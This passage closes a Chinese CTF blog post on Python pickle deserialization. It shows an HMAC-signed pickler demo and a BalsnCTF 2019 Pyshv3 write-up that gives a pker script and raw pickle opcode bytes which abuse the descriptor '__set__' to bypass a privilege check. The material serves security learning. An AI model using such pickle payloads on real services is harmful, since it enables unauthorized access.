</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>loads</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>sign</span> <span style=color:#f92672>=</span> <span style=color:#111>data</span><span style=color:#111>[:</span><span style=color:#ae81ff>32</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>        <span style=color:#111>p</span> <span style=color:#f92672>=</span> <span style=color:#111>data</span><span style=color:#111>[</span><span style=color:#ae81ff>32</span><span style=color:#f92672>+</span><span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>seperator</span><span style=color:#111>):]</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>assert</span> <span style=color:#111>sign</span> <span style=color:#f92672>==</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>digital_signature</span><span style=color:#111>(</span><span style=color:#111>p</span><span style=color:#111>),</span> <span style=color:#111>(</span><span style=color:#d88200>&#34;Data is tampered by someone.&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>p</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>dumps</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>obj</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>p</span> <span style=color:#f92672>=</span> <span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>obj</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>sign</span> <span style=color:#f92672>=</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>digital_signature</span><span style=color:#111>(</span><span style=color:#111>p</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#34;</span><span style=color:#d88200>%s%s%s</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span><span style=color:#111>sign</span><span style=color:#111>,</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>seperator</span><span style=color:#111>,</span> <span style=color:#111>p</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>main</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>SECRET_KEY</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>pickler</span> <span style=color:#f92672>=</span> <span style=color:#111>HMAC_Pickler</span><span style=color:#111>(</span><span style=color:#111>SECRET_KEY</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>obj</span> <span style=color:#f92672>=</span> <span style=color:#111>Student</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Jack&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>19</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>obj</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>p</span> <span style=color:#f92672>=</span> <span style=color:#111>pickler</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>obj</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>p</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#111>pickler</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>p</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>o</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>p</span> <span style=color:#f92672>+=</span> <span style=color:#d88200>&#34;I am hacker, trying evil things&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>x</span> <span style=color:#f92672>=</span> <span style=color:#111>pickler</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>p</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>x</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>main</span><span style=color:#111>()</span>
</span></span></code></pre></div></li></ul><details><summary><h4 class=inline>栗子9 - [BalsnCTF 2019] Pyshv3</h4></summary><p>这次的find_class()没有变化，但是structs有具体的实现</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png alt=image-20210812012841569></p><p>同时server.py的逻辑也发生了变化，不用rce了，直接有一个拿flag的函数，但需要self.user.privileged为True才可以返回</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013032487.png alt=image-20210812013032487></p><p>而这个self.user.privileged在一开始就被设为了False</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013115089.png alt=image-20210812013115089></p><p>emmmm 这怎么绕过捏？</p><p>先说非预期，将<code>__builtins__</code>复制到modules属性上；再说说预期解。</p><p>我们知道，有<code>__get__</code>，<code>__set__</code>这样描述器协议方法的对象称为描述器descriptor。默认对属性的访问控制都是从对象的字典__dict__里面进行获取(get)，设置(set)和删除(delete)的方法（前面的那道题也用到这个点）。举例来说，<code>a.x</code>的查找顺序是<code>a.__dict__['x']</code>，之后<code>type(a).__dict__['x']</code>，然后找type(a)的父类。如果查找到的值是一个描述器，python就会调用描述器的方法来重写默认的控制行为，这个重写发生在这个查找环节的哪里取决于定义了哪个描述器方法。（注意：只有在新式类中时描述器才起作用）（更多介绍参见：<a href=https://foofish.net/what-is-descriptor-in-python.html>什么是描述符（descriptor）</a>）</p><p>我们利用描述器的特性，将User类的<code>__set__</code>方法重载为structs.User，并把它的privileged属性赋值为一个User实例。当进行self.user.privileged被赋值时触发<code>__set__</code>，但由于已经被重写，所以并不会被赋值False，而是保持原样，还是一个User实例。在后面if判断时，User实例当然是True，就可以绕过了。</p><p>pker</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>User</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;structs&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;User&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>User</span><span style=color:#f92672>.</span><span style=color:#111>__set__</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;structs&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;User&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>user</span> <span style=color:#f92672>=</span> <span style=color:#111>User</span><span style=color:#111>(</span><span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#ae81ff>0</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>User</span><span style=color:#f92672>.</span><span style=color:#111>privileged</span> <span style=color:#f92672>=</span> <span style=color:#111>user</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span> <span style=color:#111>user</span>
</span></span></code></pre></div><p>opcode</p><pre tabindex=0><code>b&#34;cstructs\nUser\np0\n0g0\n(}(S&#39;__set__&#39;\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S&#39;privileged&#39;\ng2\ndtbg2\n.&#34;
</code></pre></details><p>考虑到这个题更综合了python的相关特性，所以把这个题放在最后。</p><hr><p>从新建文件到写完用了几天时间，细细地整理相关知识，也算是对反序列化这个知识点的认识清晰了不少。还有一个PyYAML的反序列化问题，由于篇幅问题拆开来放到下一篇中。自认为总结的还是比较详细的（嘿嘿x）不过肯定还有不周到的地方，之后如遇到更多知识还会进行补充。</p><p>自己还是有惰性啊，其实反序列化第一篇总结的是php，可是到现在还有几个二级标题下面是空白的……只能先给自己找个借口：php反序列化的东西实在是太多了TAT</p><hr><p>最后放一下全篇用到的的参考文章（部分已写在对应标题下面），不分先后~</p><p><a href=https://www.cnblogs.com/wjrblogs/p/14057784.html>Python 反序列化漏洞学习笔记</a> | <a href=https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/>一篇文章带你理解漏洞之 Python 反序列化漏洞</a> | <a href=https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2>pickle反序列化初探</a> | <a href=https://www.anquanke.com/post/id/188981#h2-10>Python pickle 反序列化实例分析</a> | <a href=https://segmentfault.com/a/1190000013099825>Python 反序列化安全问题（一）</a> - <a href=https://segmentfault.com/a/1190000013214956>Python 反序列化安全问题（二）</a> | <a href=https://zhuanlan.zhihu.com/p/89132768>从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势</a> | <a href=https://blog.csdn.net/weixin_39929635/article/details/111003485>关于Python sec的一些简单的总结</a> | <a href=https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf>Sour Pickles A serialised exploitation guide in one part - Macro Slaviero</a> | <a href=https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#>🐍 Security Issues in Python Pickle</a></p></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/life/ title="Fxxking life page">Fxxking life</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><li class="px-1 md:px-0"><a href=https://www.travellings.cn/go.html title="Travelling page">Travelling</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href='TW9uJTIwMTglMjBGZWJydWFyeSUyMDE5ODAlMjAyMTowMjo1NSUyMFVUQw==' target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href=https://weibo.com/u/7562434112 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 13882 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/2021/08/08/redpwn2021-wp/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>RedpwnCTF2021 Wp</a>
<a class=flex-grow-0 href=/2021/08/18/ractf2021-wp/>RACTF2021 Wp<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a></div><div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//amiaaaz.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script></div></body></html>